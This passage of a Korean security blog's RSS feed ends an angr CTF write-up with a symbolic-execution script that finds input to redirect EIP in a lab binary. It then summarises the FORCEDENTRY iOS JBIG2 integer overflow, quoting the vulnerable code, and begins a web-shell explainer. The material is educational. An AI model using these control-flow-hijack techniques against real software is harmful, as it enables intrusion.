&#xBC14;&#xB014; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; state&#xAC00; &#xC774; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xB9CC;&#xC871;&#xD558;&#xC9C0; &#xBABB;&#xD55C;&#xB2E4;&#xBA74; &#xACC4;&#xC18D; &#xB8E8;&#xD504;&#xB97C; &#xB3CC;&#xBA70; &#xD655;&#xC778;&#xD558;&#xACE0; &#xCC3E;&#xC558;&#xB2E4;&#xBA74; &#xADF8; &#xC989;&#xC2DC; &#xB8E8;&#xD504;&#xB97C; &#xD0C8;&#xCD9C;&#xD574; &#xB098;&#xBA38;&#xC9C0; unconstrained&#xD55C; state&#xB97C; &#xBAA8;&#xB450; &#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">if</span> solution_state:  <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> solution_state.posix.files[sys.stdin.fileno()].all_bytes().chop(bits=<span class="hljs-number">8</span>):    solution_state.add_constraints(byte &gt;= <span class="hljs-number">0x41</span>, byte &lt;= <span class="hljs-number">0x5A</span>)</code></pre><p>&#xC870;&#xAC74;&#xC81C;&#xC57D;&#xC5D0; &#xBD80;&#xD569;&#xD558;&#xB294; state&#xB97C; &#xCC3E;&#xC73C;&#xBA74; &#xC774;&#xC81C; &#xCD9C;&#xB825;&#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC870;&#xAC74; &#xC81C;&#xC57D;&#xC740; &#xC55E;&#xC5D0;&#xC640; &#xAC19;&#xC740;&#xB370; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xB3C4;&#xCD9C;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xB2E4;&#xB974;&#xB124;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xB098;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xB3CC;&#xB824;&#xBD05;&#xB2C8;&#xB2E4;! &#xD558;&#xC9C0;&#xB9CC;&#x2026;</p><pre><code class="hljs python">File <span class="hljs-string">&quot;sol17.py&quot;</span>, line <span class="hljs-number">111</span>, <span class="hljs-keyword">in</span> &lt;module&gt;    main(sys.argv)  File <span class="hljs-string">&quot;sol17.py&quot;</span>, line <span class="hljs-number">79</span>, <span class="hljs-keyword">in</span> main    <span class="hljs-keyword">if</span> unconstrained_state.satisfiable(extra_constraints=(eip == <span class="hljs-number">0x42585249</span>)):  File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_state.py&quot;</span>, line <span class="hljs-number">566</span>, <span class="hljs-keyword">in</span> satisfiable    <span class="hljs-keyword">return</span> self.solver.satisfiable(**kwargs)  File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/state_plugins/sim_action_object.py&quot;</span>, line <span class="hljs-number">57</span>, <span class="hljs-keyword">in</span> ast_stripper    <span class="hljs-keyword">return</span> f(*new_args, **new_kwargs)  File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/state_plugins/solver.py&quot;</span>, line <span class="hljs-number">89</span>, <span class="hljs-keyword">in</span> wrapped_f    <span class="hljs-keyword">return</span> f(*args, **kwargs)  File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/state_plugins/solver.py&quot;</span>, line <span class="hljs-number">651</span>, <span class="hljs-keyword">in</span> satisfiable    <span class="hljs-keyword">return</span> self._solver.satisfiable(extra_constraints=self._adjust_constraint_list(extra_constraints), exact=exact)  File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/claripy/frontend_mixins/constraint_filter_mixin.py&quot;</span>, line <span class="hljs-number">33</span>, <span class="hljs-keyword">in</span> satisfiable    ec = self._constraint_filter(extra_constraints)  File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/claripy/frontend_mixins/constraint_filter_mixin.py&quot;</span>, line <span class="hljs-number">4</span>, <span class="hljs-keyword">in</span> _constraint_filter    <span class="hljs-keyword">raise</span> ClaripyValueError(<span class="hljs-string">&quot;The extra_constraints argument should be a list of constraints.&quot;</span>)claripy.errors.ClaripyValueError: The extra_constraints argument should be a list of constraints.</code></pre><p>??? </p><p><code>(eip == 0x42585249)</code> &#xC774; &#xBD80;&#xBD84;&#xC774; &#xB9AC;&#xC2A4;&#xD2B8;&#xC5EC;&#xC57C; &#xD558;&#xB124;&#xC694;. &#xC774;&#xAC70;&#xB294; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; <code>[eip == 0x42585249]</code> &#xC774;&#xB807;&#xAC8C; &#xBC14;&#xAFD4;&#xC11C; &#xB2E4;&#xC2DC; &#xB3CC;&#xB824;&#xBD05;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74;!!!</p><pre><code class="hljs python">Traceback (most recent call last):  File <span class="hljs-string">&quot;sol17.py&quot;</span>, line <span class="hljs-number">111</span>, <span class="hljs-keyword">in</span> &lt;module&gt;    main(sys.argv)  File <span class="hljs-string">&quot;sol17.py&quot;</span>, line <span class="hljs-number">97</span>, <span class="hljs-keyword">in</span> main    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> solution_state.posix.files[sys.stdin.fileno()].all_bytes().chop(bits=<span class="hljs-number">8</span>):AttributeError: <span class="hljs-string">&apos;SimSystemPosix&apos;</span> object has no attribute <span class="hljs-string">&apos;files&apos;</span></code></pre><p>?????!?!?!?!?!!!?! &#xD558;&#x2026; &#xADF8;&#xB9CC; &#xC880;&#x2026;. &#xC65C; &#xB610; &#xC5C6;&#xB294;&#xAC74;&#xB370;&#x2026;</p><p>&#xD574;&#xB2F5;&#xC740; &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><p><a href="https://github.com/angr/angr/issues/1186">posix.files[0] is now removed but still in example #1186</a></p><p><code>posix.files</code>&#xAC00; &#xC5C6;&#xC5B4;&#xC84C;&#xB2E4;&#xB294; &#xAD70;&#xC694;. &#xADF8;&#xB7FC; &#xC785;&#xB825;&#xAC12; &#xD574;&#xB2F5;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xAC00;&#xC838;&#xC624;&#xB0D0;? <code>posix.stdin.content[0][0]</code> &#xC774;&#xB807;&#xAC8C; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xB41C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xD558;&#x2026; &#xC774;&#xAC83;&#xB3C4; &#xB098;&#xB984; &#xC0BD;&#xC9C8; &#xC880; &#xD588;&#xB124;&#xC694;.</p><p>&#xC554;&#xD2BC; &#xC774;&#xAC83;&#xB9CC; &#xC218;&#xC815;&#xD558;&#xBA74; &#xC9C4;&#xC9DC; &#xB05D;!</p><h2 id="sol17-py"><a href="#sol17-py" class="headerlink" title="sol17.py"></a>sol17.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()   simulation = project.factory.simgr(initial_state, save_unconstrained=<span class="hljs-literal">True</span>)  solution_state = <span class="hljs-literal">None</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_found_solution</span>():</span>    <span class="hljs-keyword">return</span> solution_state <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_unconstrained</span>():</span>    <span class="hljs-keyword">return</span> len(simulation.unconstrained) &gt; <span class="hljs-number">0</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_active</span>():</span>    <span class="hljs-keyword">return</span> len(simulation.active) &gt; <span class="hljs-number">0</span>  <span class="hljs-keyword">while</span> (has_active() <span class="hljs-keyword">or</span> has_unconstrained()) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> has_found_solution()):    <span class="hljs-keyword">for</span> unconstrained_state <span class="hljs-keyword">in</span> simulation.unconstrained:      eip = unconstrained_state.regs.eip      <span class="hljs-keyword">if</span> unconstrained_state.satisfiable(extra_constraints=[eip == <span class="hljs-number">0x42585249</span>]):        solution_state = unconstrained_state        solution_state.add_constraints(solution_state.regs.eip == <span class="hljs-number">0x42585249</span>)        <span class="hljs-keyword">break</span>    simulation.drop(stash=<span class="hljs-string">&apos;unconstrained&apos;</span>)    simulation.step()  <span class="hljs-keyword">if</span> solution_state:    print(solution_state.posix.stdin.content[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> solution_state.posix.stdin.content[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].chop(bits=<span class="hljs-number">8</span>):      solution_state.add_constraints(byte &gt;= <span class="hljs-number">0x41</span>, byte &lt;= <span class="hljs-number">0x5A</span>)    solution = solution_state.posix.dumps(sys.stdin.fileno())        print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol17.py <span class="hljs-number">17</span>_angr_arbitrary_jumpWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-23</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">35</span>,<span class="hljs-number">025</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-23</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">35</span>,<span class="hljs-number">026</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-23</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">35</span>,<span class="hljs-number">026</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-23</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">35</span>,<span class="hljs-number">026</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-23</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">35</span>,<span class="hljs-number">026</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-23</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">35</span>,<span class="hljs-number">026</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x425852d1</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">17</span>_angr_arbitrary_jump (<span class="hljs-number">0x425852d1</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-23</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">35</span>,<span class="hljs-number">028</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x425852d3</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">17</span>_angr_arbitrary_jump (<span class="hljs-number">0x425852d3</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-23</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">36</span>,<span class="hljs-number">171</span> | angr.engines.successors | Exit state has over <span class="hljs-number">256</span> possible solutions. Likely unconstrained; skipping. &lt;BV32 Reverse(packet_0_stdin_9_480[<span class="hljs-number">191</span>:<span class="hljs-number">160</span>])&gt;&lt;BV480 packet_0_stdin_9_480&gt;<span class="hljs-string">b&apos;AABBAAAAAABABBAABBAAABABAAAABBBBABAAIRXBAAAAAAAAAAAAAAAAAAAA&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">17</span>_angr_arbitrary_jumpEnter the password: AABBAAAAAABABBAABBAAABABAAAABBBBABAAIRXBAAAAAAAAAAAAAAAAAAAAGood Job.</code></pre><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xD558; &#xB4DC;&#xB514;&#xC5B4; &#xAE38;&#xACE0; &#xAE38;&#xC5C8;&#xB358; angr_ctf&#xAC00; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p><img src="/2021/09/26/j0ker/angr_part6/123.jpeg" alt="_109109790_057054015-1.jpeg"></p><blockquote><p>&#xC6C3;&#xB294;&#xAC8C; &#xC6C3;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xC57C;&#x2026;</p></blockquote><p>&#xC774;&#xC81C; &#xC2DC;&#xC791;&#xC785;&#xB2C8;&#xB2E4;. CTF &#xBB38;&#xC81C;&#xB3C4; &#xD480;&#xC5B4;&#xC57C;&#xD558;&#xACE0; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC775;&#xC2A4;&#xD560; &#xC218; &#xC788;&#xB294;&#xAC83;&#xB3C4; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xACE0; &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB3C4; &#xCC3E;&#xC544;&#xC57C;&#xD558;&#xB294;&#xB370;&#x2026; &#xC774;&#xC81C; &#xB9C9; &#xBC1C;&#xAC78;&#xC74C;&#xC744; &#xB550; &#xB290;&#xB08C;&#xC785;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; CTF &#xBB38;&#xC81C; 10&#xAC1C;&#xB97C; &#xD478;&#xB294;&#xAC8C; &#xBAA9;&#xD45C;&#xC774;&#xAE30;&#xB294; &#xD55C;&#xB370;&#x2026;. &#xC774;&#xAC70;&#xB294; &#xD480;&#xBA74;&#xC11C; &#xB2E4;&#xC2DC; &#xACE0;&#xBBFC;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xC870;-&#xBC14;~</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/angr/">angr</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit/">exploit</category>
      
      <category domain="https://hackyboiz.github.io/tags/symbolic-execution/">symbolic_execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/newbie/">newbie</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/26/j0ker/angr_part6/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-30860: Pegasus 스파이웨어에서 악용된 iOS FORCEDENTRY 취약점</title>
      <link>https://hackyboiz.github.io/2021/09/25/l0ch/2021-09-25/</link>
      <guid>https://hackyboiz.github.io/2021/09/25/l0ch/2021-09-25/</guid>
      <pubDate>Sat, 25 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trendmicro.com/en_us/research/21/i/analyzing-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/21/i/analyzing-pegasus-spywares-zero-click-iphone-exploit-forcedentry.html">Analyzing The ForcedEntry Zero-Click iPhone Exploit Used By Pegasus</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>iOS &lt; 14.8</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NSO Group&#xC774; &#xAC1C;&#xBC1C;&#xD55C; &#xC2A4;&#xD30C;&#xC774;&#xC6E8;&#xC5B4;&#xC778; Pegasus&#xC5D0; &#xC758;&#xD574; &#xC545;&#xC6A9;&#xB418;&#xC5B4; &#xC628; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC9C4; FORCEDENTRY&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; zero-click iOS &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; iMessage &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC218;&#xC2E0;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xCCA8;&#xBD80;&#xB41C; PDF &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; JBIG2&#xB85C; &#xC778;&#xCF54;&#xB529; &#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB514;&#xCF54;&#xB529;&#xD558;&#xAE30; &#xC704;&#xD574; iOS&#xC758; CoreGraphics &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294;<code>JBIG2Stream::readTextRegionSeg</code> &#xD568;&#xC218;&#xC758; &#xC77C;&#xBD80; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">1</span>:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> numSyms = <span class="hljs-number">0</span>;<span class="hljs-number">2</span>:<span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; nRefSegs; ++i){<span class="hljs-number">3</span>:<span class="hljs-keyword">if</span>((seg = findSegment(refSegs[i]))) {<span class="hljs-number">4</span>:<span class="hljs-keyword">if</span>(seg-&gt;getType() == jbig2SegSymbolDict) {<span class="hljs-number">5</span>:numSyms += ((JBIG2SymbolDict *)seg)-&gt;getSize();  <span class="hljs-comment">//integer overflow</span><span class="hljs-number">6</span>:} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(seg-&gt;getType() == jbig2SegCodeTable) {<span class="hljs-number">7</span>:codeTables-&gt;append(seg);<span class="hljs-number">8</span>:}<span class="hljs-number">9</span>:} <span class="hljs-keyword">else</span> {<span class="hljs-number">10</span>:error(getPos(), <span class="hljs-string">&quot;Invalid segment referencein JBIG2 text region&quot;</span>);<span class="hljs-number">11</span>:<span class="hljs-keyword">delete</span> codeTables;<span class="hljs-number">12</span>:<span class="hljs-keyword">return</span>;<span class="hljs-number">13</span>:}<span class="hljs-number">14</span>:}</code></pre><p>line 5&#xC5D0;&#xC11C; <code>numSyms</code>&#xC758; type&#xACFC; <code>seg&#x2192;getSize()</code>&#xC758; return type&#xC740; &#xBAA8;&#xB450; <code>unsigned int</code>&#xC785;&#xB2C8;&#xB2E4;. <code>seg</code>&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xCDA9;&#xBD84;&#xD788; &#xD070; &#xACBD;&#xC6B0; &#xB8E8;&#xD504;&#xB97C; &#xC218;&#xD589;&#xD558;&#xBA70; <code>seg&#x2192;getSize()</code>&#xB97C; <code>numSyms</code>&#xC5D0; &#xB204;&#xC801;&#xD558;&#xB294; &#xB3D9;&#xC548; <code>numSyms</code>&#xC5D0;&#xC11C; integer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">syms = (JBIG2Bitmap **)gmallocn(numSyms, <span class="hljs-keyword">sizeof</span>(JBIG2Bitmap *)); <span class="hljs-comment">// size of JBIG2Bitmap = 8</span></code></pre><p>&#xC774;&#xD6C4; <code>gmallocn</code> &#xD568;&#xC218;&#xB85C; <code>numSyms * 8</code>&#xB9CC;&#xD07C;&#xC758; <code>syms</code> &#xD799;&#xC744; &#xD560;&#xB2F9;&#xD55C; &#xB4A4; &#xBE44;&#xD2B8;&#xB9F5;&#xC758; &#xAC12;&#xC73C;&#xB85C; <code>syms</code>&#xB97C; &#xCC44;&#xC6B0;&#xB294;&#xB370;, integer overflow&#xB85C; &#xC778;&#xD574; &#xBE44;&#xD2B8;&#xB9F5;&#xC758; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xD799;&#xC774; &#xD560;&#xB2F9;&#xB418;&#xACE0; out-of-bounds write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD574;&#xCEE4;&#xAC00; &#xD0C0;&#xAC9F; &#xC544;&#xC774;&#xD3F0;&#xC5D0; &#xC545;&#xC131; &#xCCA8;&#xBD80; &#xD30C;&#xC77C;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xD0C0;&#xAC9F;&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC5C6;&#xC774; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; zero-click exploit&#xC774;&#xBA70; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD55C; &#xC2A4;&#xD30C;&#xC774;&#xC6E8;&#xC5B4; Pegasus&#xB294; &#xC9C0;&#xB09C; 2&#xC6D4;&#xBD80;&#xD130; &#xAC01;&#xAD6D;&#xC758; &#xC815;&#xBD80; &#xAE30;&#xAD00;&#xC5D0; &#xACF5;&#xAE09;&#xB418;&#xC5B4; &#xC8FC;&#xC694; &#xC778;&#xC0AC; &#xC0AC;&#xCC30;&#xC5D0; &#xC4F0;&#xC778; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ios/">ios</category>
      
      <category domain="https://hackyboiz.github.io/tags/spyware/">spyware</category>
      
      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob-write/">oob write</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-30860/">cve-2021-30860</category>
      
      <category domain="https://hackyboiz.github.io/tags/pegasus/">pegasus</category>
      
      <category domain="https://hackyboiz.github.io/tags/forcedentry/">forcedentry</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/25/l0ch/2021-09-25/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Web Shell</title>
      <link>https://hackyboiz.github.io/2021/09/24/poosic/Web-Shell/</link>
      <guid>https://hackyboiz.github.io/2021/09/24/poosic/Web-Shell/</guid>
      <pubDate>Fri, 24 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xC640; OS&amp;#xAC04; &amp;#xC911;&amp;#xACC4;&amp;#xC790; &amp;#xC5ED;&amp;#xD560;&amp;#xC744; &amp;#xD558;&amp;#xBA70; &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC0AC;&#xC6A9;&#xC790;&#xC640; OS&#xAC04; &#xC911;&#xACC4;&#xC790; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xBA70; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xACFC; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD574;&#xC8FC;&#xB294; <a href="https://hackyboiz.github.io/2021/09/17/poosic/Shell/">&#xC258;</a>&#xCC98;&#xB7FC; &#xC6F9; &#xC258;(Web Shell)&#xB3C4; &#xC6F9;&#xC0C1; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xBA85;&#xB839;&#xC744; &#xB0B4;&#xB9B4; &#xC218; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB098; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xD639;&#xC740; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xBA85;&#xB839;&#xC744; &#xB0B4;&#xB9B4; &#xC218; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB098; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xACF5;&#xACA9;&#xC744; &#xBD80;&#xB974;&#xB294; &#xB9D0;&#xC785;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/09/24/poosic/Web-Shell/image1.png" alt="Untitled.jpg"></p><h3 id="&#xC65C;-&#xC704;&#xD5D8;&#xD560;&#xAE4C;&#xC694;"><a href="#&#xC65C;-&#xC704;&#xD5D8;&#xD560;&#xAE4C;&#xC694;" class="headerlink" title="&#xC65C; &#xC704;&#xD5D8;&#xD560;&#xAE4C;&#xC694;?"></a>&#xC65C; &#xC704;&#xD5D8;&#xD560;&#xAE4C;&#xC694;?</h3><p>&#xC6F9; &#xC258;&#xC740; &#xC81C;&#xC791; &#xBC29;&#xBC95;&#xB3C4; &#xAC04;&#xB2E8;&#xD558;&#xACE0; &#xC11C;&#xBC84;&#xC5D0; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xB294; &#xD30C;&#xAE09;&#xB825;&#xB3C4; &#xD06C;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBB34;&#xC11C;&#xC6B4; &#xACF5;&#xACA9;&#xC785;&#xB2C8;&#xB2E4;. &#xC6F9; &#xC258;&#xC740; ASP,JSP,PHP&#xB4F1;&#xC758; &#xC11C;&#xBC84; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xAC04;&#xB2E8;&#xD55C; &#xCF54;&#xB4DC;&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xC81C;&#xC791;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9C8;&#xC74C;&#xB9CC; &#xBA39;&#xC73C;&#xBA74; &#xB204;&#xAD6C;&#xB098; &#xC27D;&#xAC8C; &#xC81C;&#xC791;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xC11C;&#xBC84;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xB9CC; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xBA74; &#xC11C;&#xBC84;&#xC758; &#xBAA8;&#xB4E0; &#xC81C;&#xC5B4;&#xAD8C;&#xC744; &#xC7A5;&#xC545;&#xD574; &#xC815;&#xBCF4; 